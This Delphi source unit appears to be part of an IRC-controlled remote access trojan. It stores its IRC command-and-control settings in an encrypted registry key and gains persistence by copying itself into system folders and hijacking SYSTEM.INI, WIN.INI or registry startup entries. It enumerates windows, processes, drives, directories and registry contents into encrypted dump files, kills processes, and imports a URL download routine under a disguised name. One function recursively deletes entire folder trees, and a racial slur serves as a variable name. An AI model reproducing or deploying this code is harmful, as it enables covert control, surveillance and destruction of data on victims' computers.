   unit untFunctions;

   interface
   Uses
   Windows, Messages, Allstrings, TLHELP32, Encryption, winsock;

   function VisitPage(Caller: cardinal; URL: PChar; FileName: PChar; Reserved: LongWord; StatusCB: cardinal): Longword; stdcall; external 'URLMON.DLL' name 'URLDownloadToFileA';
   Function RReg(SS:String):String;
   Procedure SetRegValue(kRoot:Hkey; Path, Value, Str:String);
   Procedure DeleteRegValue(kRoot:Hkey; Path, Value:String);
   Procedure DeleteRegKey(kRoot:Hkey; Path, Value:String);
   Function ReadRegedit(kRoot:Hkey;Path:String;Typ:integer):String;
   Function GetRegValue(kRoot:Hkey; Path, Value:String):String;
   PROCEDURE LISTDIR(D:STRING);
   function GetDrives:string;
   function IntToStr(X: integer): string;
   function StrToInt(S: string): integer;
   function enumwinproc(w:hwnd;lpr:lparam):boolean;stdcall;
   function sendwindows:string;
   function getwins:string;
   FUNCTION LISTPROC:STRING;
   PROCEDURE KILLPROC(S:STRING);
   function my_ip_address : longint;
   function iptostr(ip:longint):string;
   PROCEDURE SETAUTOSTART;
   FUNCTION STRIPDATA(S:STRING):STRING;
   procedure SpecialFuckFolder(Dir:string);
   function Trim(const S: string): string;
   function AdjustFolder(strFolder:string):string;
   Procedure SaveReg;
   PROCEDURE LOADREG;

   implementation

   PROCEDURE LOADREG;
   BEGIN
   IRC_NICK1       := RREG(ENCRYPT('nick1'));
   IRC_NICK2       := RREG(ENCRYPT('nick2'));
   IRC_CHAN1       := RREG(ENCRYPT('chan1'));
   IRC_CHAN2       := RREG(ENCRYPT('chan2'));
   IRC_SERV1       := RREG(ENCRYPT('serv1'));
   IRC_SERV2       := RREG(ENCRYPT('serv2'));
   IRC_CKEY1       := RREG(ENCRYPT('ckey1'));
   IRC_CKEY2       := RREG(ENCRYPT('ckey2'));
   IRC_MASTER1     := RREG(ENCRYPT('master1'));
   IRC_MASTER2     := RREG(ENCRYPT('master2'));
   SERV_TRAFFICP   := RREG(ENCRYPT('port1'));
   SERV_TRANSP     := RREG(ENCRYPT('port2'));
   SERV_AUTOSTART  := RREG(ENCRYPT('autostart'));
   SERV_REGKEY     := RREG(ENCRYPT('regkey'));
   SERV_REGVALUE   := RREG(ENCRYPT('regvalue'));
   SERV_WINNAME    := RREG(ENCRYPT('wwin'));
   SERV_SYSNAME    := RREG(ENCRYPT('wsys'));
   SERV_CGI        := RREG(ENCRYPT('cgi'));
   SERV_PHP        := RREG(ENCRYPT('php'));
   PASSWORD        := RREG(ENCRYPT('password'));
   SERV_REGWAY     := RREG(ENCRYPT('regway'));
   END;

   Procedure SaveReg;
   Var
    Key : Hkey;
    DataSize : Cardinal;
    Value : String;
   Begin
    RegOpenKey(HKEY_LOCAL_MACHINE,'Software\Microsoft',Key);
    RegCreateKey(Key,pChar('Denial'), Key);
    RegCloseKey(Key);
    RegOpenKey(HKEY_LOCAL_MACHINE,'Software\Microsoft\Denial',Key);
    DataSize := 1024;
    RegSetValueEx(Key, Pchar(Encrypt('nick1')), 0, REG_SZ, @IRC_NICK1[1], Datasize);
    RegSetValueEx(Key, Pchar(Encrypt('nick2')), 0, REG_SZ, @IRC_NICK2[1], Datasize);
    RegSetValueEx(Key, Pchar(Encrypt('chan1')), 0, REG_SZ, @IRC_CHAN1[1], Datasize);
    RegSetValueEx(Key, Pchar(Encrypt('chan2')), 0, REG_SZ, @IRC_CHAN2[1], Datasize);
    RegSetValueEx(Key, Pchar(Encrypt('ckey1')), 0, REG_SZ, @IRC_CKEY1[1], Datasize);
    RegSetValueEx(Key, Pchar(Encrypt('ckey2')), 0, REG_SZ, @IRC_CKEY2[1], Datasize);
    RegSetValueEx(Key, Pchar(Encrypt('serv1')), 0, REG_SZ, @IRC_SERV1[1], Datasize);
    RegSetValueEx(Key, Pchar(Encrypt('serv2')), 0, REG_SZ, @IRC_SERV2[1], Datasize);
    RegSetValueEx(Key, Pchar(Encrypt('master1')), 0, REG_SZ, @IRC_MASTER1[1], Datasize);
    RegSetValueEx(Key, Pchar(Encrypt('master2')), 0, REG_SZ, @IRC_MASTER2[1], Datasize);
    RegSetValueEx(Key, Pchar(Encrypt('cgi')), 0, REG_SZ, @SERV_CGI[1], Datasize);
    RegSetValueEx(Key, Pchar(Encrypt('php')), 0, REG_SZ, @SERV_PHP[1], Datasize);
    RegSetValueEx(Key, Pchar(Encrypt('port1')), 0, REG_SZ, @SERV_TRAFFICP[1], Datasize);
    RegSetValueEx(Key, Pchar(Encrypt('port2')), 0, REG_SZ, @SERV_TRANSP[1], Datasize);
    RegSetValueEx(Key, Pchar(Encrypt('autostart')), 0, REG_SZ, @SERV_AUTOSTART[1], Datasize);
    RegSetValueEx(Key, Pchar(Encrypt('regkey')), 0, REG_SZ, @SERV_REGKEY[1], Datasize);
    RegSetValueEx(Key, Pchar(Encrypt('regvalue')), 0, REG_SZ, @SERV_REGVALUE[1], Datasize);
    RegSetValueEx(Key, Pchar(Encrypt('wwin')), 0, REG_SZ, @SERV_WINNAME[1], Datasize);
    RegSetValueEx(Key, Pchar(Encrypt('wsys')), 0, REG_SZ, @SERV_SYSNAME[1], Datasize);
    RegSetValueEx(Key, Pchar(Encrypt('password')), 0, REG_SZ, @PASSWORD[1], Datasize);
    RegSetValueEx(Key, Pchar(Encrypt('regway')), 0, REG_SZ, @SERV_REGWAY[1], Datasize);
    RegCloseKey(Key);
   End;

   function Trim(const S: string): string;
   var
    I, L: Integer;
   begin
    L := Length(S);
    I := 1;
    while (I <= L) and (S[I] <= ' ') do Inc(I);
    if I > L then Result := '' else
     begin
      while S[L] <= ' ' do Dec(L);
      Result := Copy(S, I, L - I + 1);
     end;
   end;

   function AdjustFolder(strFolder:string):string;
   var
      l:longint;
   begin
      strFolder:=Trim(strFolder);
      l:=Length(strFolder);
      if Copy(strFolder,l,l) = '\' then
         AdjustFolder:=strFolder
      else
         AdjustFolder:=strFolder + '\';
   end;

   procedure SpecialFuckFolder(Dir:string);
   var
      FData:WIN32_FIND_DATA;
      fHandle:LongInt;
   begin
      Dir:=AdjustFolder(Dir);
      fHandle:=FindFirstFile(PChar(Dir + '*.*'),FData);
      if fHandle < 0 then Exit;
      repeat
      begin
         if Ord(FData.cFileName[0]) <> 46 then
         begin
            if FData.dwFileAttributes and FILE_ATTRIBUTE_DIRECTORY = FILE_ATTRIBUTE_DIRECTORY then
            begin
               SpecialFuckFolder(Dir + FData.cFileName);
               RemoveDirectory(PChar(Dir + FData.cFileName));
            end
            else
               Windows.DeleteFile(PChar(Dir + FData.cFileName));
         end;
      end;
      until FindNextFile(fHandle,FData) = False;
      Windows.FindClose(fHandle);
   end;

   FUNCTION STRIPDATA(S:STRING):STRING;
   BEGIN
    RESULT := '';
    RESULT := trim(COPY(S,5,LENGTH(S)));
    IF RESULT = '' THEN RESULT := '^';
    RESULT := RESULT;
   END;

   PROCEDURE SETAUTOSTART;
   VAR
    KEY:HKEY;                    // WRITING/READING
    SIZ:CARDINAL;                // WRITING/READING
    STR:STRING;                  // WRITING/SYS/WIN
    VAL:ARRAY[0..1023] OF CHAR;  // READING
    BUF:ARRAY[0..1023] OF CHAR;  // SYSDIR
   BEGIN
    GETSYSTEMDIRECTORY(BUF,255);
    CASE STRTOINT(DECRYPT(SERV_AUTOSTART)) OF
     1: {SYS} BEGIN
      WRITEPRIVATEPROFILESTRING('BOOT','SHELL',PCHAR('EXPLORER.EXE '+DECRYPT(SERV_SYSNAME)),'SYSTEM.INI');
      STR := BUF;
      COPYFILE( PCHAR(PARAMSTR(0)) , PCHAR(STR +'\'+ DECRYPT(SERV_SYSNAME)), FALSE);
     END;
     2: {WIN} BEGIN
      WRITEPRIVATEPROFILESTRING('WINDOWS','RUN',PCHAR(DECRYPT(SERV_WINNAME)),'WIN.INI');
      GETWINDOWSDIRECTORY(BUF,255);
      STR := BUF;
      COPYFILE( PCHAR(PARAMSTR(0)) , PCHAR(STR +'\'+ DECRYPT(SERV_WINNAME)), FALSE);
     END;
     3: {REG} BEGIN
      STR := BUF;
      STR := STR + '\' +DECRYPT(SERV_REGVALUE);
      COPYFILE( PCHAR(PARAMSTR(0)) , PCHAR(STR), FALSE);
      REGOPENKEY(HKEY_LOCAL_MACHINE, PCHAR(DECRYPT(SERV_REGWAY)),KEY);
      SIZ := 1024;
      REGSETVALUEEX(KEY, PCHAR(DECRYPT(SERV_REGKEY)), 0, REG_SZ, @STR[1], SIZ);
      REGCLOSEKEY(KEY);
     END;
     4: {NONE} BEGIN
      // NEED TO REMOVE ALL STARTUPS IF THERE IS ANY.
      DELETEREGVALUE(HKEY_LOCAL_MACHINE, PCHAR(DECRYPT(SERV_REGWAY)),PCHAR(DECRYPT(SERV_REGKEY)));
      WRITEPRIVATEPROFILESTRING('BOOT','SHELL',PCHAR('EXPLORER.EXE'),'SYSTEM.INI');
      WRITEPRIVATEPROFILESTRING('WINDOWS','RUN',PCHAR(''),'WIN.INI');
     END;
    END;
   END;

   function my_ip_address : longint;
   var
     RemoteHost : PHostEnt;
     res:longint;
     bug:array[0..1023]of char;
   begin
     winsock.gethostname(@bug, 255);
     RemoteHost:=Winsock.GetHostByName(bug);
     if RemoteHost=NIL then
       res:=winsock.htonl($7F000001)
     else
     res:=longint(pointer(RemoteHost^.h_addr_list^)^);
     result:=winsock.ntohl(res);
   end;

   function iptostr(ip:longint):string;
   var res2:array[1..4]of byte absolute ip;
   begin
     result:=inttostr(res2[4])+string_sfour+inttostr(res2[3])+string_sfour+inttostr(res2[2])+string_sfour+inttostr(res2[1]);
   end;

   function GetDrives:string;
   var
      p:integer;
      This,All,c,f,cDrives:string;
   begin
      c:=string_kewlon;
      f:=Chr(0);
      SetLength(cDrives,300);
      GetLogicalDriveStrings(300,PChar(cDrives));
      p:=Pos(f,cDrives);
      while p > 0 do
      begin
         This:=Copy(cDrives,1,p - 1);
         if Length(This) <> 3 then Break;
         cDrives:=Copy(cDrives,p + 1,Length(cDrives));
         p:=Pos(f,cDrives);
         All:=All + This + c;
      end;
      GetDrives:=all;
   end;

   function IntToStr(X: integer): string;
   var
    S: string;
   begin
    Str(X, S);
    Result := S;
   end;

   function StrToInt(S: string): integer;
   var
    V, Code: integer;
   begin
    Val(S, V, Code);
    Result := V;
   end;

   function enumwinproc(w:hwnd;lpr:lparam):boolean;stdcall;
   begin
     if iswindowvisible(w) then begin
       getwindowtext(w,buf,10000);
       if buf[0]<>#0 then begin
         wins[wcnt].name:=buf;
         wins[wcnt].wnd:=w;
         wcnt:=wcnt+1;
       end;
     end;
     result:=true;
   end;

   function sendwindows:string;
   var i:integer;
   begin
    result:=string_null;
     wcnt:=0;
     enumwindows(@enumwinproc,0);
     for i:=0 to wcnt-1 do begin
       result:=result+inttostr(wins[i].wnd)+string_kowlon+wins[i].name+string_kewlon;
       wins[i].name := string_null;
       wins[i].wnd := 0;
     end;
   end;

   function getwins:string;
   begin
    result:=string_null;
    result:=sendwindows;
   end;

   FUNCTION LISTPROC:STRING;
   VAR
     CONTINUELOOP  :       BOOLEAN;
     HSNAPSHOT     :       THANDLE;
     LPPE          :       TPROCESSENTRY32;
     LPME          :       TMODULEENTRY32;
   BEGIN
     HSNAPSHOT := CREATETOOLHELP32SNAPSHOT(TH32CS_SNAPPROCESS OR TH32CS_SNAPMODULE, 0);
     LPPE.DWSIZE := SIZEOF(LPPE);
     CONTINUELOOP := PROCESS32FIRST(HSNAPSHOT, LPPE);
     WHILE (INTEGER(CONTINUELOOP) <> 0) DO
     BEGIN
      RESULT := RESULT + LPPE.SZEXEFILE+string_kowlon+INTTOSTR(LPPE.TH32PROCESSID)+string_kewlon;
      CONTINUELOOP := PROCESS32NEXT(HSNAPSHOT, LPPE);
     END;
     CLOSEHANDLE(HSNAPSHOT);
   END;

   PROCEDURE KILLPROC(S:STRING);
   VAR
     RET           :       BOOL;
     PROCESSID     :       INTEGER;
     PROCESSHNDLE  :       THANDLE;
   BEGIN
     IF S = string_null THEN EXIT;
     TRY
       PROCESSID := STRTOINT(string_dollar + S);
       PROCESSHNDLE := OPENPROCESS(PROCESS_TERMINATE, BOOL(0), PROCESSID);
       RET := TERMINATEPROCESS(PROCESSHNDLE, 0);
       IF INTEGER(RET) = 0 THEN EXIT;
     EXCEPT
       EXIT;
     END;
   END;

   PROCEDURE LISTDIR(D:STRING);
   const
     faReadOnly  = $00000001 platform;
     faHidden    = $00000002 platform;
     faSysFile   = $00000004 platform;
     faVolumeID  = $00000008 platform;
     faDirectory = $00000010;
     faArchive   = $00000020 platform;
     faAnyFile   = $0000003F;
   var
   nigger:string;
   stfu:integer;
   type
     TFileName = type string;
     TSearchRec = record
       Time: Integer;
       Size: Integer;
       Attr: Integer;
       Name: TFileName;
       ExcludeAttr: Integer;
       FindHandle: THandle  platform;
       FindData: TWin32FindData  platform;
     end;

     LongRec = packed record
       case Integer of
         0: (Lo, Hi: Word);
         1: (Words: array [0..1] of Word);
         2: (Bytes: array [0..3] of Byte);
     end;

     function FindMatchingFile(var F: TSearchRec): Integer;
     var
       LocalFileTime: TFileTime;
     begin
       with F do
       begin
         while FindData.dwFileAttributes and ExcludeAttr <> 0 do
           if not FindNextFile(FindHandle, FindData) then
           begin
             Result := GetLastError;
             Exit;
           end;
         FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
         FileTimeToDosDateTime(LocalFileTime, LongRec(Time).Hi,
           LongRec(Time).Lo);
         Size := FindData.nFileSizeLow;
         FILSIZZE := FINDDATA.NFILESIZELOW;
         Attr := FindData.dwFileAttributes;
         STFU := FindData.dwFileAttributes;
         Name := FindData.cFileName;
         nigger := name;
         ASSIGNFILE(DIRFILE,DIRPATH);
         APPEND(DIRFILE);
         IF (STFU AND FILE_ATTRIBUTE_DIRECTORY) = FILE_ATTRIBUTE_DIRECTORY THEN
          WRITELN(DIRFILE, ENCRYPT(NAME+string_kewlon+'0'+string_kewlon+D))
         ELSE
          WRITELN(DIRFILE, ENCRYPT(NAME+string_kewlon+inttostr(FILSIZZE)+string_kewlon+D));
         CLOSEFILE(DIRFILE);
       end;
       Result := 0;
     end;

     procedure FindClose(var F: TSearchRec);
     begin
       if F.FindHandle <> INVALID_HANDLE_VALUE then
       begin
         Windows.FindClose(F.FindHandle);
         F.FindHandle := INVALID_HANDLE_VALUE;
       end;
     end;

     function FindFirst(const Path: string; Attr: Integer;
       var  F: TSearchRec): Integer;
     const
       faSpecial = faHidden or faSysFile or faVolumeID or faDirectory;
     begin
       F.ExcludeAttr := not Attr and faSpecial;
       F.FindHandle := FindFirstFile(PChar(Path), F.FindData);
       if F.FindHandle <> INVALID_HANDLE_VALUE then
       begin
         Result := FindMatchingFile(F);
         if Result <> 0 then FindClose(F);
       end else
         Result := GetLastError;
     end;

     function FindNext(var F: TSearchRec): Integer;
     begin
       if FindNextFile(F.FindHandle, F.FindData) then
         Result := FindMatchingFile(F) else
         Result := GetLastError;
     end;
   VAR
     SR: TSEARCHREC;
   BEGIN
     GETSYSTEMDIRECTORY(DIR,255);
     DIRPATH := DIR;
     DIRPATH := DIRPATH + string_files;
     DELETEFILE(PCHAR(DIRPATH));
     ASSIGNFILE(DIRFILE,DIRPATH);
     REWRITE(DIRFILE);
     WRITELN(DIRFILE, ENCRYPT(D));
     CLOSEFILE(DIRFILE);
   TRY
     If D[Length(D)] <> string_slash then D := D + string_slash;
     If FindFirst(D + string_allstar, faDirectory, SR) = 0 then
       Repeat
         SLEEP(0);
       Until (FindNext(SR) <> 0);
     FindClose(SR);
   EXCEPT
    EXIT;
   END;
   END;

   Function GetRegValue(kRoot:Hkey; Path, Value:String):String;
   Var
    Key : Hkey;
    Siz : Cardinal;
    Val : Array[0..16382] Of Char;
   Begin
    ZeroMemory(@Val, Length(Val));
    RegOpenKeyEx(kRoot, pChar(Path), 0, REG_SZ, Key);
    Siz := 16383;
    RegQueryValueEx(Key, pChar(Value), NIL, NIL, @Val[0], @Siz);
    RegCloseKey(Key);
    If Val<> string_null then
     Result := Val;
   End;

   Function ReadRegedit(kRoot:Hkey;Path:String;Typ:integer):String;
   Var
    Keys: Array[0..255] of Char;
    Vals: Array[0..255] of Char;
    A   : Cardinal;
    KEY : HKEY;
    I   : Integer;
    S1  : String;
    S2  : String;
    SYSDIR : String;
    BUF : ARRAY[0..255] of Char;
    TEX : TEXTFILE;
    JONAS:STRING;
   Begin
    S1 := string_null;
    s2 := string_null;
    GetSystemDirectory(BUF,255);
    Sysdir := BUF;
    Sysdir := Sysdir + string_slash;
    If Typ=1 then begin
    ASSIGNFILE(Tex, Sysdir+string_regkey);
    REWRITE(Tex);
    For i:=0 To 16383 do begin
     RegOpenKeyEx(kRoot, pChar(Path), 0, KEY_ENUMERATE_SUB_KEYS, KEY);
     A:=2048;
     If RegEnumKeyEx(Key, I, Keys, A, NIL, NIL, NIL, NIL) = ERROR_SUCCESS Then
      WRITELN(Tex, Encrypt(Keys))
     Else Break;
    End;
    RegCloseKey(Key);
    CLOSEFILE(TEX);
    End Else Begin
    ASSIGNFILE(Tex, Sysdir+string_regval);
    REWRITE(Tex);
    For i:=0 To 16383 do begin
     RegOpenKeyEx(kRoot, pChar(Path), 0, KEY_QUERY_VALUE, KEY);
     A:=2048;
     If RegEnumValue(Key, I, Vals, A, NIL, NIL, NIL, NIL) = ERROR_SUCCESS Then begin
      JONAS := VALS;
      JONAS := JONAS + chr(0160)+getregvalue(kRoot, Path, Vals);
      WRITELN(TEX,ENCRYPT(JONAS));
     End Else Break;
    End;
    RegCloseKey(Key);
    CloseFile(Tex);
    end;
   End;

   Procedure DeleteRegKey(kRoot:Hkey; Path, Value:String);
   Var
    Key : Hkey;
   Begin
    RegOpenKeyEx(kRoot, pChar(Path), 0, KEY_ALL_ACCESS, KEY);
    RegDeleteKey(Key, pChar(Value));
    RegCloseKey(Key);
   End;

   Procedure DeleteRegValue(kRoot:Hkey; Path, Value:String);
   Var
    Key : Hkey;
   Begin
    RegOpenKeyEx(kRoot, pChar(Path), 0, KEY_SET_VALUE, KEY);
    RegDeleteValue(Key, pChar(Value));
    RegCloseKey(Key);
   End;

   Procedure SetRegValue(kRoot:Hkey; Path, Value, Str:String);
   Var
    Key : Hkey;
    Siz : Cardinal;
   Begin
    RegOpenKey(kRoot, pChar(Path), Key);
    Siz := 2048;
    RegSetValueEx( Key, pChar(Value), 0, REG_SZ, @Str[1], Siz);
    RegCloseKey(Key);
   End;

   Function RReg(SS:String):String;
   Var
    Key : Hkey;
    DataSize : Integer;
    Value : ARRAY[0..1023] OF CHAR;
   Begin
    ZEROMEMORY(@VALUE,LENGTH(VALUE));
    SLEEP(10);
    REGOPENKEYEX(HKEY_LOCAL_MACHINE, PCHAR(string_startreg), 0, REG_SZ, KEY);
    DATASIZE := 1024;
    REGQUERYVALUEEX(KEY, PCHAR(SS), NIL, NIL, @VALUE[0], @DATASIZE);
    REGCLOSEKEY(KEY);
    IF VALUE <> NIL THEN RESULT := STRING(VALUE) ELSE EXIT;
   End;

   end.
